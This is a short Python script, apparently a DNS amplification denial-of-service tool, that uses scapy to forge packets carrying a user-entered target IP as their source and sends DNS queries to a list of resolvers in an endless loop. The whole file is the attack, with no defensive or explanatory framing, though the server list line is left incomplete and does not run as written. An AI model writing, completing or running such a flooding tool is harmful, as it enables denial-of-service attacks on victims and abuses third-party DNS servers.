from scapy.all import IP, UDP, DNS, DNSQR, send
from multiprocessing import Pool
import time 

servers = # Insert list of vulnurable dns servers here in a bracketed list []
targetip = input("enter target")

def amp(server):
    dns_query = IP(src = targetip, dst = server) / UDP(dport = 53) / DNS(rd=1, qd=DNSQR(qname = "google.com"))
    send(dns_query, verbose=0)

def sendreq():
    with Pool(processes=len(servers)) as pool:
        pool.map(amp, servers)

if __name__ == "__main__":
    while True:
        sendreq()
        print("sent!")
        time.sleep(0.25)
